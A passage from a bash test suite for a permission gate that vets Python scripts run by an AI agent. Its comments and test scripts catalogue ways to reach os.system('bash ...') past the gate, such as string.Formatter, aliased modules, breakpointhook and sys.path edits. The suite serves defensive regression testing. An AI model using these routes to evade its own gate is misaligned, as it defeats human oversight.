env = os.environ
flags, kinds = re.I, (pathlib.Path, datetime.time)
def sizes(names, key=os.path.getsize, codec=json):
    return codec.dumps(sorted(names, key=key))
def stamp(p: pathlib.Path, when: datetime.datetime = None) -> datetime.time:
    return (when or datetime.datetime.now(timezone.utc)).time()
parser = argparse.ArgumentParser()
parser.add_argument("file", type=pathlib.Path)
args = parser.parse_args()
text = args.file.read_text()
try:
    rows = j.loads(text)
except json.JSONDecodeError:
    rows = list(map(loads, [ln for ln in text.splitlines() if ln.startswith("{")]))
for fn in (len, str.strip):
    print(fn(text[:40]))
if zoneinfo is not None and zoneinfo and not isinstance(rows, (Path, time)):
    print(pth.getsize(args.file), path.basename(str(args.file)), join("a", "b"), P("x").name, env.get("HOME"))
print(sizes([str(args.file)]), stamp(args.file), isinstance(args.file, kinds), re.search("chat", text, flags) is not None)
print([m.__name__ for m in ()], sorted([str(args.file)], key=pth.getsize))
PY
run_02 "python3 reads-renamed.py msg.json"
allowed "#3102 the control: a read only script that renames modules and hands their functions on passes"
run_02 "python3 reads-renamed.py $RULES"
allowed "#3102 and handed the real rules file"
run_02 "python3 -c 'import json, sys; j = json; print(len(j.loads(open(sys.argv[1]).read())))' msg.json"
allowed "#3102 the control: code given inline that renames a module only to read passes"
# The control for the walrus cases: a walrus in a class body and one over a choice of two pass where
# what they bind is no module, and a module a followed walrus renames is still read on from.
cat > "$D02/reads-walrus.py" <<'PY'
import json, re, sys
class Reader:
    if (limit := len(sys.argv)) > 1:
        cap = limit
    (pattern := re.compile("chat"))
    (flags := re.I or 0)
text = open(sys.argv[1]).read()
if (j := json) and (m := Reader.pattern.search(text)) and (lines := text.splitlines() or None):
    print(m.group(0), len(lines), (n := len(text) or 1), (a := (b := len(lines))), j.dumps(lines[:1]))
PY
run_02 "python3 reads-walrus.py msg.json"
allowed "#3102 the control: a read only script with a walrus in a class body and one over a choice of two passes"
run_02 "python3 reads-walrus.py $RULES"
allowed "#3102 and handed the real rules file"
# The from import check runs for every module inline code may import, the ones it may import for its
# files (errno, io, stat, tempfile) included (the lessons review of PR #3130). It sat behind the line
# that passes those four, so code a shell script writes inline could write `from tempfile import os`
# and then os.system(...): measured through the gate at 055ac70, both forms below passed, exit 0 and
# nothing said. Neither can run on a Python measured (3.9.6, 3.11.16, 3.14.4): none of the four holds
# a module under a public name but io.abc, which is inert, so the import stops with ImportError before
# the next line. The gate still read a script that names os.system as one unable to act, so the check
# now comes first. os keeps its own line: `from os import stat` is os's call, not the stat module.
cat > "$D02/inline-from-files.sh" <<'SH'
#!/bin/bash
python3 - "$1" <<'PY'
import sys
from tempfile import os
os.system("bash " + sys.argv[1])
PY
SH
cat > "$D02/inline-from-files-as.sh" <<'SH'
#!/bin/bash
python3 - "$1" <<'PY'
import sys
from io import os as tool
tool.system("bash " + sys.argv[1])
PY
SH
for imported in inline-from-files.sh inline-from-files-as.sh; do
  run_02 "bash $imported msg.json"
  read_refused "#3102 inline code importing a module out of one it may import for its files is refused: $imported"
done
run_02 "bash inline-from-files.sh msg.json"
says "#3102 in the words the same import gets from any other module" "imports os from tempfile, which reaches the os module through tempfile"
cat > "$D02/inline-files.sh" <<'SH'
#!/bin/bash
python3 - "$1" <<'PY'
import sys
from errno import ENOENT
from io import StringIO, abc
from os import path, stat
from stat import S_ISDIR
from tempfile import gettempdir
print(StringIO(open(sys.argv[1]).read()).getvalue()[:20], S_ISDIR(stat(gettempdir()).st_mode), path.basename(sys.argv[1]), ENOENT)
PY
SH
run_02 "bash inline-files.sh msg.json"
allowed "#3102 the control: inline code importing those modules' own names, and os's stat and path, still passes"

# The reading asks the standard library module itself, so a judgement it took part in rests on where
# Python finds that module and on what its file holds. Both are asked through the stand ins the
# judgement cache records (lib/judgement-cache.py), and a kept judgement is not used once either has
# changed. Measured through the gate at 055ac70, where the module was imported by name: "its
# judgement is kept" failed for both scripts below (the cache traced "not stored: importlib.import_module,
# which the recorder does not know"), so no call whose script renamed a module was ever answered
# from the cache; and the file of the same name in front of the standard library's was run inside
# the gate. The cache's own checks of this are in test-judgement-cache.sh.
D02C="$T/d3102-kept"
mkdir -p "$D02C/w" "$D02C/pp" "$D02C/other"
cp "$D02/msg.json" "$D02C/w/msg.json"
printf '%s\n' 'import numbers, sys' 'n = numbers' 'print(isinstance(len(open(sys.argv[1]).read()), n.Integral))' > "$D02C/w/counts.py"
printf '%s\n' 'import cmath, sys' 'q = cmath' 'print(q.pi, len(open(sys.argv[1]).read()))' > "$D02C/w/compiled.py"
# run_02c <command>: judged with a cache of its own, traced, with $D02C/pp on the gate's own path.
run_02c() {
  : > "$D02C/trace"
  PYTHONPATH="$D02C/pp" SLACK_GATE_CACHE_DIR="$D02C/cache" SLACK_GATE_CACHE_TRACE="$D02C/trace" \
    run_raw "$(payload Bash "$(bash_input "$1")" "$D02C/w")"
}
# traced_02 <what> <start> [<also>]: a trace line starts with <start> (so "stored" is never "not
# stored") and, where given, holds <also>.
traced_02() { if awk -v p="$2" -v q="${3:-}" 'index($0, p) == 1 && (q == "" || index($0, q)) { f = 1 } END { exit !f }' "$D02C/trace"
              then check "$1" ok; else check "$1" "the cache traced: $(tr '\n' '|' < "$D02C/trace")"; fi; }
run_02c "python3 counts.py msg.json"
allowed "#3102 a script that renames a module written in Python, only to read, passes"
traced_02 "#3102 its judgement is kept" "stored"
run_02c "python3 counts.py msg.json"
allowed "#3102 judged again with nothing changed, it passes"
traced_02 "#3102 and is answered from the cache" "hit"
run_02c "python3 compiled.py msg.json"
allowed "#3102 a script that renames a compiled module, only to read, passes"
traced_02 "#3102 its judgement is kept too" "stored"
run_02c "python3 compiled.py msg.json"
traced_02 "#3102 and is answered from the cache" "hit"
# A file of the module's name in a folder the command's own path holds too: the gate's placing of
# the import looked there, so the kept judgement is not used (by whichever of its recorded answers
# is asked first, here that file test).
printf '%s\n' 'Integral = int' > "$D02C/pp/numbers.py"
run_02c "python3 counts.py msg.json"
traced_02 "#3102 once a file of the module's name is on the path, the kept judgement is not used" "miss: " "answers differently now"
rm -f "$D02C/pp/numbers.py"
run_02c "python3 counts.py msg.json"
allowed "#3102 with that file gone, the script passes as before"
# The same where the command sets a path of its own, so the only thing that looks in the gate's
# folder is the reading's own question, where does Python find numbers. Kept while the answer is the
# standard library's; not used once it is that file; and the file, which is not the standard
# library's, is not run to answer. It says so itself if it is.
run_02c "PYTHONPATH=$D02C/other python3 counts.py msg.json"
allowed "#3102 the same script run with a path of its own passes"
traced_02 "#3102 its judgement is kept" "stored"
run_02c "PYTHONPATH=$D02C/other python3 counts.py msg.json"
traced_02 "#3102 and is answered from the cache" "hit"
printf '%s\n' 'import sys' "open('$D02C/ran', 'w').write('ran')" 'Integral = int' > "$D02C/pp/numbers.py"
run_02c "PYTHONPATH=$D02C/other python3 counts.py msg.json"
traced_02 "#3102 once Python would find the module in another file, the kept judgement is not used" "miss: find_spec" "answers differently now"
allowed "#3102 judged afresh, the script still passes"
if [ -e "$D02C/ran" ]; then check "#3102 and the gate does not run that file" "the gate ran $D02C/pp/numbers.py"
else check "#3102 and the gate does not run that file" ok; fi
rm -f "$D02C/pp/numbers.py"

echo
echo "slack drafts only: three more routes to os in a Python script are followed (claude-config#3119)"

# Three routes past the #3102 reading, each of which passed the gate as it stood (measured
# 2026-11-17 by the cases below, exit 0 and nothing said, handed a data file naming an endpoint):
# a string naming attributes, read by string.Formatter; an attribute chain that starts at a call's
# result, a parameter or any other value the gate does not follow; and a module one of the script's
# own modules binds under another name. Each now counts as able to act: Formatter wherever it is
# named, os read off a value the gate does not follow (any other attribute of one is read as a
# field, as the controls at the end show), and os bound under another name where that name is read.
D19="$T/d3119"
mkdir -p "$D19"
cp "$D02/msg.json" "$D19/msg.json"
run_19() { run_raw "$(payload Bash "$(bash_input "$1")" "$D19")"; }
w19() { local name="$1"; shift; printf '%s\n' "$@" > "$D19/$name"; }
SYS19='.system("bash " + sys.argv[1])'
# string.Formatter reads the attributes a field names, so a string reaches what no attribute shows:
# a function's globals, a class's attributes, and a subclass's format_field is handed what it found.
w19 fmt-function.py 'import glob, string, sys' "string.Formatter().get_field(\"0.__globals__[os]\", (glob.glob,), {})[0]$SYS19"
w19 fmt-class.py 'import pathlib, string, sys' "string.Formatter().get_field(\"0.parser.os\", (pathlib.PurePath,), {})[0]$SYS19"
w19 fmt-from.py 'import glob, sys' 'from string import Formatter' "Formatter().get_field(\"0.__globals__[os]\", (glob.glob,), {})[0]$SYS19"
w19 fmt-renamed.py 'import glob, string, sys' 's = string' "s.Formatter().get_field(\"0.__globals__[os]\", (glob.glob,), {})[0]$SYS19"
w19 fmt-subclass.py 'import glob, string, sys' 'class F(string.Formatter):' '    def format_field(self, value, spec):' \
  "        value$SYS19" '        return ""' 'F().format("{0.__globals__[os]}", glob.glob)'
# A chain from a value the gate does not follow: a call's result, a parameter handed a class, a
# name bound to an instance, a subscript, a name functools.update_wrapper copied a class's
# attribute onto, and a class body's own import.
w19 call-chain.py 'import pathlib, sys' "pathlib.PurePath(\"x\").parser.os$SYS19"
w19 param-chain.py 'import pathlib, sys' 'def go(c, p):' '    c.parser.os.system("bash " + p)' 'go(pathlib.PurePath, sys.argv[1])'
w19 lambda-chain.py 'import pathlib, sys' '(lambda c, p: c.parser.os.system("bash " + p))(pathlib.PurePath, sys.argv[1])'
w19 instance-chain.py 'import pathlib, sys' 'p = pathlib.PurePath("x")' "p.parser.os$SYS19"
w19 subscript-chain.py 'import pathlib, sys' "[pathlib.PurePath][0].parser.os$SYS19"
w19 wrapper-chain.py 'import functools, pathlib, sys' 'class H: pass' 'h = H()' \
  'functools.update_wrapper(h, pathlib.PurePath, assigned=("parser",), updated=())' "h.parser.os$SYS19"
w19 class-import.py 'import sys' 'class C:' '    import os' "C.os$SYS19"
# A module the script's own module binds under another name: handed on (the issue's own form, and
# one whose helper uses it straight away), read through the module, imported out of it, and os
# imported by its own name out of such a module. And os imported under another name in a class
# body, or by a function into the module's globals, where a chain through the class or the module
# reaches it under that name.
w19 lib_g.py 'import glob as helper'
w19 lib_os.py 'import os as helper' 'def size(p):' '    return helper.path.getsize(p)'
w19 lib_plain.py 'import os' 'def size(p):' '    return os.path.getsize(p)'
w19 lib_global.py 'def setup():' '    global helper' '    import os as helper'
w19 own-glob-handed.py 'import lib_g, sys' 'def go(m, p):' '    m.os.system("bash " + p)' 'go(lib_g.helper, sys.argv[1])'
w19 own-handed.py 'import lib_os, sys' 'def go(m, p):' '    m.system("bash " + p)' 'go(lib_os.helper, sys.argv[1])'
w19 own-direct.py 'import lib_os, sys' "lib_os.helper$SYS19"
w19 own-from.py 'import sys' 'from lib_os import helper' "helper$SYS19"
w19 own-from-os.py 'import sys' 'from lib_plain import os' "os$SYS19"
w19 own-from-os-as.py 'import sys' 'from lib_plain import os as tool' "tool$SYS19"
w19 own-global.py 'import lib_global, sys' 'lib_global.setup()' "lib_global.helper$SYS19"
w19 class-alias.py 'import sys' 'class C:' '    import os as helper' "C.helper$SYS19"
for route in fmt-function.py fmt-class.py fmt-from.py fmt-renamed.py fmt-subclass.py \
  call-chain.py param-chain.py lambda-chain.py instance-chain.py subscript-chain.py wrapper-chain.py class-import.py \
  own-glob-handed.py own-handed.py own-direct.py own-from.py own-from-os.py own-from-os-as.py own-global.py class-alias.py; do
  run_19 "python3 $route msg.json"
  read_refused "#3119 a route to os the gate did not follow is refused: $route"
done
run_19 "python3 fmt-function.py msg.json"
says "#3119 the refusal names string.Formatter" "reaches past what the gate reads (Formatter)"
run_19 "python3 call-chain.py msg.json"
says "#3119 the refusal names the module and the value it was reached through" "reaches the os module through pathlib.PurePath('x').parser, which the gate does not follow"
run_19 "python3 own-handed.py msg.json"
says "#3119 the refusal names the module that binds os under another name" "imports lib_os.py, which binds os as helper"
run_19 "python3 own-from-os.py msg.json"
says "#3119 os imported out of the script's own module is held to os's reads" "uses os for more than reading files, paths and the environment (os.system)"
run_19 "python3 class-alias.py msg.json"
says "#3119 and os imported under another name in a class body" "binds os as helper"
# The controls: read only scripts that call a method named like a module, read a chain from a call's
# result and a parameter, format a string, import os under another name at their own top level or
# in a function, and import the script's own module that imports os by name, still pass.
w19 lib_fn.py 'def size(p):' '    import os as o' '    return o.path.getsize(p)'
cat > "$D19/reads-routes.py" <<'PY'
import argparse, os as o, pathlib, string, sys
import lib_fn, lib_plain
from lib_plain import size
parser = argparse.ArgumentParser()
parser.add_argument("file", type=pathlib.Path)
args = parser.parse_args()
def width(p):
    return p.stat().st_size
print(args.file.stat().st_size, pathlib.Path(args.file).parent.name, width(args.file))
print("{0.name}".format(args.file), string.Template("$x").substitute(x=1), o.path.basename(str(args.file)))
print(lib_fn.size(args.file), size(args.file), sorted([str(args.file)], key=lib_plain.size))
PY
run_19 "python3 reads-routes.py msg.json"
allowed "#3119 the control: a read only script with chains from calls and parameters and its own modules passes"
run_19 "python3 reads-routes.py $RULES"
allowed "#3119 and handed the real rules file"
# A field of a script's own named like a standard library module is a field, not the module: the
# chain rule is about reaching os, so a value it does not follow may have any other attribute read
# off it, and on through it (Dan's choice on PR #3161, 2026-11-17). Each of these was refused by the
# rule's first version, which refused every standard library module's name off the list.
w19 field-email.py 'import argparse, sys' 'parser = argparse.ArgumentParser()' 'parser.add_argument("file")' \
  'parser.add_argument("--email", default="a@example.com")' 'args = parser.parse_args()' \
  'print(args.email, args.email.lower(), len(open(args.file).read()))'
w19 field-code.py 'import sys' 'try:' '    sys.exit(len(open(sys.argv[1]).read()) % 3)' 'except SystemExit as e:' \
  '    print(e.code, str(e.code).zfill(2))'
w19 field-queue.py 'import sys' 'class Store:' '    def __init__(self):' '        self.queue = []' \
  '    def add(self, line):' '        self.queue.append(line)' '        return len(self.queue)' \
  's = Store()' 'print(s.add(open(sys.argv[1]).read()[:20]), s.queue)'
for field in field-email.py field-code.py field-queue.py; do
  run_19 "python3 $field msg.json"
  allowed "#3119 a field named like a standard library module is read as a field: $field"
done

echo "slack drafts only: builtins under another name, sys.breakpointhook and sys.path under another name are read (claude-config#3151)"

# Three more routes, each of which ran on Python 3.14.4 and passed the gate as it stood (measured
# 2026-11-17 by the cases below, exit 0 and nothing said, handed a data file naming an endpoint).
# One: enum binds builtins as bltns (Python 3.12 and later), a name no standard library module has,
# so enum.bltns.exec(...) named no module off the list and exec was an attribute, not the builtin.
# Two: sys.breakpointhook imports and calls whatever PYTHONBREAKPOINT names, set by the script
# itself or on the command, and only the builtin breakpoint was read. Three: sys.path was read only
# as the name sys followed by path, so sys under another name, sys read off another module
# (glob.sys) and sys read off a value the gate does not follow (pathlib.PurePath("x").parser.sys)
# all changed where Python finds modules unseen.
D51="$T/d3151"
mkdir -p "$D51/lib"
cp "$D02/msg.json" "$D51/msg.json"
run_51() { run_raw "$(payload Bash "$(bash_input "$1")" "$D51")"; }
w51() { local name="$1"; shift; printf '%s\n' "$@" > "$D51/$name"; }
EXEC51='.exec("import os; os.system(\"bash \" + sys.argv[1])")'
w51 bltns.py 'import enum, sys' "enum.bltns$EXEC51"
w51 bltns-renamed.py 'import enum, sys' 'e = enum' "e.bltns$EXEC51"
w51 bltns-from.py 'import sys' 'from enum import bltns' "bltns$EXEC51"
w51 bltns-open.py 'import enum, sys' 'enum.bltns.open(sys.argv[1], "a").close()'
w51 hook-env.py 'import os, sys' 'os.environ["PYTHONBREAKPOINT"] = "os.system"' 'sys.breakpointhook("bash " + sys.argv[1])'
w51 hook.py 'import sys' 'sys.breakpointhook("bash " + sys.argv[1])'
w51 hook-from.py 'import sys' 'from sys import breakpointhook' 'breakpointhook("bash " + sys.argv[1])'
w51 hook-renamed.py 'import sys' 's = sys' 's.breakpointhook("bash " + sys.argv[1])'
# The other name on sys that runs code it is given by name rather than as a function the script
# already holds: sys.remote_exec (Python 3.14) runs a file in a Python process, the script's own
# included (measured 2026-11-17: handed its own pid and a file, the file ran).
w51 remote.py 'import os, sys' 'sys.remote_exec(os.getpid(), sys.argv[1])'
PATH51='.path.insert(0, "lib")'
w51 path-call-chain.py 'import pathlib' "pathlib.PurePath(\"x\").parser.sys$PATH51" 'import json'
w51 path-module-chain.py 'import glob' "glob.sys$PATH51" 'import json'
w51 path-as.py 'import sys as s' "s$PATH51" 'import json'
w51 path-renamed.py 'import sys' 'q = sys' "q$PATH51" 'import json'
w51 path-renamed-chain.py 'import glob' 'q = glob.sys' "q$PATH51" 'import json'
w51 path-from.py 'from glob import sys as s' "s$PATH51" 'import json'
w51 path-default.py 'import sys' 'def go(m=sys):' "    m$PATH51" 'go()' 'import json'
w51 path-unfollowed-name.py 'import pathlib' 'p = pathlib.PurePath("x").parser.sys' "p$PATH51" 'import json'
# sys read off one of the script's own modules, whose attributes the gate does not read: the value
# is one reached from a module and not known to be one, which is not the same as one reached from
# no module, and a name bound to it was not taken as a name for sys (PR #3151 review; measured
# 2026-11-17, path-own-module-name.py passed with exit 0 while path-own-module-chain.py, the same
# read with no name in between, was refused).
w51 lib_sys.py 'import sys'
w51 path-own-module-chain.py 'import lib_sys' "lib_sys.sys$PATH51" 'import json'
w51 path-own-module-name.py 'import lib_sys' 'q = lib_sys.sys' "q$PATH51" 'import json'
for route in bltns.py bltns-renamed.py bltns-from.py bltns-open.py hook-env.py hook-from.py hook-renamed.py remote.py \
  path-call-chain.py path-module-chain.py path-as.py path-renamed.py path-renamed-chain.py path-from.py \
  path-default.py path-unfollowed-name.py path-own-module-chain.py path-own-module-name.py; do
  run_51 "python3 $route msg.json"
  read_refused "#3151 a route the gate did not read is refused: $route"
done
run_51 "PYTHONBREAKPOINT=os.system python3 hook.py msg.json"
read_refused "#3151 and sys.breakpointhook with PYTHONBREAKPOINT set on the command"
run_51 "python3 bltns.py msg.json"
says "#3151 the refusal names enum's name for builtins" "reaches past what the gate reads (bltns)"
run_51 "python3 hook-env.py msg.json"
says "#3151 the refusal names sys.breakpointhook" "reaches past what the gate reads (breakpointhook)"
run_51 "python3 path-call-chain.py msg.json"
says "#3151 sys.path read off a value the gate does not follow is named as sys.path" "changes where Python finds modules (sys.path)"
run_51 "python3 path-as.py msg.json"
says "#3151 and sys.path under another name" "changes where Python finds modules (sys.path)"
# The class behind bltns (L96): a module the gate holds to be inert may bind any module under a
# name that is not the module's own, which a reading by name cannot see. Every such name this
# Python has is found here, from the gate's own list (its names cut out of the gate's text and
# handed over as words, never the file), and a script reading through it must be refused, so the
# next one fails here on the Python that brings it.
read -r -a INERT51 <<< "$(sed -n '/^PY_INERT = frozenset({/,/})/p' "$DIR/slack_drafts_only_gate.py" | grep -o '"[A-Za-z_.]*"' | tr -d '"' | tr '\n' ' ')"
python3 -B - ${INERT51[@]+"${INERT51[@]}"} > "$D51/aliases.txt" 2>"$D51/aliases.err" <<'PY'
import importlib, sys
MODULE = type(sys)
seen, todo = set(), []
for name in sorted(sys.argv[1:]):
    try:
        todo.append((name, importlib.import_module(name)))
    except ImportError:
        pass  # a module this Python does not have binds nothing
print(f"modules {len(todo)}")
while todo:
    label, mod = todo.pop()
    if id(mod) in seen:
        continue
    seen.add(id(mod))
    for attr, value in sorted(vars(mod).items()):
        if attr.startswith("_") or not isinstance(value, MODULE):
            continue
        if value.__name__.split(".")[-1] != attr:
            print(f"alias {label} {attr} {value.__name__}")
        if value.__name__.startswith(mod.__name__ + "."):
            todo.append((f"{label}.{attr}", value))
PY
walked="$(sed -n 's/^modules //p' "$D51/aliases.txt")"
if [ "${walked:-0}" -ge 40 ] 2>/dev/null; then check "#3151 the walk read the gate's list of inert modules ($walked of them)" ok
else check "#3151 the walk read the gate's list of inert modules" "it read ${walked:-none}: $(head -c 300 "$D51/aliases.err")"; fi
if python3 -c 'import sys; sys.exit(0 if sys.version_info >= (3, 12) else 1)'; then
  if grep -qx 'alias enum bltns builtins' "$D51/aliases.txt"; then check "#3151 and finds builtins under enum's name for it" ok
  else check "#3151 and finds builtins under enum's name for it" "it found: $(tr '\n' '|' < "$D51/aliases.txt")"; fi
else
  echo "SUITE-PART-UNMEASURED enum binds builtins as bltns only on Python 3.12 and later, and this is $(python3 -V 2>&1)"
fi
ALIASES51="$(grep '^alias ' "$D51/aliases.txt")"
while read -r _ module attr real; do
  [ -n "$module" ] || continue  # a here document of nothing found is one empty line
  w51 "alias-$module-$attr.py" "import $module, sys" "$module.$attr.x(sys.argv[1])"
  run_51 "python3 alias-$module-$attr.py msg.json"
  read_refused "#3151 a script reading through $module.$attr, which is the $real module, is refused"
done <<EOF
$ALIASES51
EOF
# The controls: enum and sys used as they ordinarily are, sys under another name for anything but
# its path, a path that is a field or os.path, and a field named sys, read and handed on, which is
# a field like any other the gate does not follow (PR #3161).
cat > "$D51/reads-3151.py" <<'PY'
import argparse, enum, os, sys
import sys as s
class Kind(enum.Enum):
    A = enum.auto()
class Times:
    def __init__(self, path):
        self.path, self.sys, self.user = path, 0.5, 1.5
    def total(self):
        return round(self.sys, 1) + self.user
q = sys
parser = argparse.ArgumentParser()
parser.add_argument("path")
args = parser.parse_args()
t = Times(args.path)
print(Kind.A.name, s.argv[0], q.platform, sys.version_info[0], t.sys, round(t.sys), t.total())
print(len(open(t.path).read()), os.path.basename(args.path), t.path.upper(), args.path.lower())
sys.stdout.write("done\n")
PY
run_51 "python3 reads-3151.py msg.json"
allowed "#3151 the control: a read only script using enum, sys under another name, a path field and a field named sys passes"
run_51 "python3 reads-3151.py $RULES"
allowed "#3151 and handed the real rules file"
# And the same narrowing for a value read off one of the script's own modules: a field called sys
# there, bound to a name and read, is a field, and only a write to its path is refused.
w51 lib_times.py 'class Times:' '    sys, user, path = 0.5, 1.5, "x"' 'now = Times()'
w51 own-module-field.py 'import lib_times' 'q = lib_times.now.sys' 'p = lib_times.now.path' 'print(q, round(q), p.upper())'
run_51 "python3 own-module-field.py msg.json"
allowed "#3151 and a field named sys read off one of the script's own modules into a name passes"

echo "slack drafts only: a submodule of an inert package, and sys put where the gate does not follow it (claude-config#3172)"

# Two more routes, each of which passed the gate as #3151 left it (measured 2026-11-17 by the cases
# below, exit 0 and nothing said, handed a data file naming an endpoint). One: PY_INERT admitted any
# submodule of a package on it, so `import json.tool` passed, and json.tool.main reads its output
# path from sys.argv and writes it (on Python 3.14.4 it wrote out.py). Two: a sys read off a value the
# gate does not follow was read on only through a name it was bound to, so the same sys handed to a
# function, put in a list, returned, or chosen by a conditional changed where Python finds modules
# unseen.
D72="$T/d3172"
mkdir -p "$D72/lib"
cp "$D02/msg.json" "$D72/msg.json"
run_72() { run_raw "$(payload Bash "$(bash_input "$1")" "$D72")"; }
w72() { local name="$1"; shift; printf '%s\n' "$@" > "$D72/$name"; }
ARGV72='sys.argv[1:] = [sys.argv[1], "out.py"]'
w72 jt-import.py 'import json.tool, sys' "$ARGV72" 'json.tool.main()'
w72 jt-as.py 'import json.tool as t, sys' "$ARGV72" 't.main()'
w72 jt-from.py 'import sys' 'from json import tool' "$ARGV72" 'tool.main()'
w72 jt-from-sub.py 'import sys' 'from json.tool import main' "$ARGV72" 'main()'
w72 jt-main.py 'import sys' "$ARGV72" 'import json.__main__' 'json.tool.main()'
for route in jt-import.py jt-as.py jt-from.py jt-from-sub.py jt-main.py; do
  run_72 "python3 $route msg.json"
  read_refused "#3172 a submodule of an inert package that is not itself on the list is refused: $route"
done
run_72 "python3 jt-import.py msg.json"
says "#3172 the refusal names the submodule" "json.tool"
PATH72='.path.insert(0, "lib")'
w72 lib_sys.py 'import sys'
w72 go-call-chain.py 'import pathlib' 'def go(m):' "    m$PATH72" 'go(pathlib.PurePath("x").parser.sys)' 'import json'
w72 go-own-module.py 'import lib_sys' 'def go(m):' "    m$PATH72" 'go(lib_sys.sys)' 'import json'
w72 go-keyword.py 'import lib_sys' 'def go(m=None):' "    m$PATH72" 'go(m=lib_sys.sys)' 'import json'
w72 go-name.py 'import lib_sys' 'q = lib_sys.sys' 'def go(m):' "    m$PATH72" 'go(q)' 'import json'
w72 ifexp-name.py 'import lib_sys, os' 'q = lib_sys.sys if os.sep else None' "q$PATH72" 'import json'
w72 ifexp-chain.py 'import os, pathlib' 'q = pathlib.PurePath("x").parser.sys if os.sep else None' "q$PATH72" 'import json'
w72 ifexp-direct.py 'import lib_sys, os' "(lib_sys.sys if os.sep else None)$PATH72" 'import json'
w72 boolop-name.py 'import lib_sys' 'q = lib_sys.sys or None' "q$PATH72" 'import json'
w72 list.py 'import lib_sys' 'qs = [lib_sys.sys]' "qs[0]$PATH72" 'import json'
w72 returned.py 'import lib_sys' 'def f():' '    return lib_sys.sys' "f()$PATH72" 'import json'
w72 cast.py 'import lib_sys, typing' "typing.cast(object, lib_sys.sys)$PATH72" 'import json'
w72 walrus.py 'import lib_sys' 'def go(m):' "    m$PATH72" 'go((q := lib_sys.sys))' 'import json'
w72 attr-store.py 'import lib_sys' 'class H:' '    pass' 'h = H()' 'h.m = lib_sys.sys' "h.m$PATH72" 'import json'
w72 shadowed-print.py 'import lib_sys' 'def print(m):' "    m$PATH72" 'print(lib_sys.sys)' 'import json'
# An operand hands sys to the other operand's method where the script writes one: a module has no
# __add__, so sys + A() calls A.__radd__ with it, and `in` calls __contains__. Each case but the one
# about the script's own module reads sys off pathlib, so that importing one of the script's own
# modules (which refuses an operand by itself) is not what refuses it.
SYS72='pathlib.PurePath("x").parser.sys'
w72 operand-radd.py 'import pathlib' 'class A:' '    def __radd__(self, m):' "        m$PATH72" '        return 0' \
  "print($SYS72 + A())" 'import json'
w72 operand-contains.py 'import pathlib' 'class A:' '    def __contains__(self, m):' "        m$PATH72" '        return True' \
  "print($SYS72 in A())" 'import json'
# The lessons review at d63d189: a chained assignment that also stores sys on an attribute, and an
# operand whose class's hook is written where the script's own class bodies do not show it (a module
# of the script's own, type() given the methods, a method set on the class afterwards).
w72 chain-attr.py 'import lib_sys' 'class H:' '    pass' 'h = H()' 'q = h.m = lib_sys.sys' "h.m$PATH72" 'import json'
w72 lib_hook.py 'class A:' '    def __radd__(self, m):' "        m$PATH72" '        return 0'
w72 operand-own-module.py 'import lib_sys, lib_hook' 'print(lib_sys.sys + lib_hook.A())' 'import json'
w72 operand-type.py 'import pathlib' 'def radd(self, m):' "    m$PATH72" '    return 0' \
  'A = type("A", (), {"__radd__": radd})' "print($SYS72 + A())" 'import json'
w72 operand-set-later.py 'import pathlib' 'class A:' '    pass' 'def radd(self, m):' "    m$PATH72" '    return 0' \
  'A.__radd__ = radd' "print($SYS72 + A())" 'import json'
# (operand-set-later.py and operand-setattr.py were refused before #3172 too, by the rule on an
# attribute starting with _ and by setattr being on PY_RUNS; they stay so a change to either is seen.)
w72 operand-setattr.py 'import pathlib' 'class A:' '    pass' 'def radd(self, m):' "    m$PATH72" '    return 0' \
  'setattr(A, "__r" + "add__", radd)' "print($SYS72 + A())" 'import json'
# The lessons review at 510611e: a hook written inside an if or a try in the class body.
w72 operand-in-if.py 'import os, pathlib' 'class A:' '    if os.sep:' '        def __radd__(self, m):' "            m$PATH72" \
  '            return 0' "print($SYS72 + A())" 'import json'
w72 operand-in-try.py 'import pathlib' 'def radd(self, m):' "    m$PATH72" '    return 0' 'class A:' '    try:' \
  '        __radd__ = radd' '    except Exception:' '        pass' "print($SYS72 + A())" 'import json'
# The lessons review at 54ccd1c: abc.ABCMeta makes a class from a dictionary whose key is built, or
# from dict() with keywords. Three reviews each found a way to give a class a method the last list
# missed, so an operand now passes only beside literals; one beside any other value is refused,
# a field added to a field included (handed the other's __radd__ all the same).
w72 operand-abcmeta-key.py 'import abc, pathlib' 'def radd(self, m):' "    m$PATH72" '    return 0' \
  'A = abc.ABCMeta("A", (), {"__r" + "add__": radd})' "print($SYS72 + A())" 'import json'
w72 operand-abcmeta-kw.py 'import abc, pathlib' 'def radd(self, m):' "    m$PATH72" '    return 0' \
  'A = abc.ABCMeta("A", (), dict(__radd__=radd))' "print($SYS72 + A())" 'import json'
w72 operand-field.py 'import pathlib' 'class T:' '    user = 1.5' 't = T()' "print($SYS72 + t.user)" 'import json'
for route in go-call-chain.py go-own-module.py go-keyword.py go-name.py ifexp-name.py ifexp-chain.py ifexp-direct.py \
  boolop-name.py list.py returned.py cast.py walrus.py attr-store.py shadowed-print.py operand-radd.py operand-contains.py \
  chain-attr.py operand-own-module.py operand-type.py operand-set-later.py operand-setattr.py operand-in-if.py \
  operand-in-try.py operand-abcmeta-key.py operand-abcmeta-kw.py operand-field.py; do
  run_72 "python3 $route msg.json"
  read_refused "#3172 sys put where the gate does not follow it is refused: $route"
done
run_72 "python3 go-call-chain.py msg.json"
says "#3172 the refusal says sys went where the gate does not follow it" "where the gate does not follow it"
# The class behind json.tool (L96): every submodule each package on the gate's list has on this
# Python, found from the list itself (its names cut out of the gate's text), is either on the list
# by its own dotted name or refused, so a submodule a later Python adds is refused until read.
read -r -a INERT72 <<< "$(sed -n '/^PY_INERT = frozenset({/,/})/p' "$DIR/slack_drafts_only_gate.py" | grep -o '"[A-Za-z_.]*"' | tr -d '"' | tr '\n' ' ')"
python3 -B - ${INERT72[@]+"${INERT72[@]}"} > "$D72/subs.txt" 2>"$D72/subs.err" <<'PY'
import importlib, pkgutil, sys
listed = set(sys.argv[1:])
for name in sorted(listed):
    try:
        mod = importlib.import_module(name)
    except ImportError:
        continue
    for sub in pkgutil.iter_modules(getattr(mod, "__path__", None) or []):
        print(("listed " if f"{name}.{sub.name}" in listed else "unlisted ") + f"{name}.{sub.name}")
PY
if grep -qx 'unlisted json.tool' "$D72/subs.txt"; then check "#3172 the walk found json.tool among the inert packages' submodules" ok
else check "#3172 the walk found json.tool among the inert packages' submodules" "it found: $(tr '\n' '|' < "$D72/subs.txt") $(head -c 300 "$D72/subs.err")"; fi
while read -r kind sub; do
  [ -n "$sub" ] || continue
  w72 "sub-$sub.py" "import $sub, sys" 'print(len(open(sys.argv[1]).read()))'
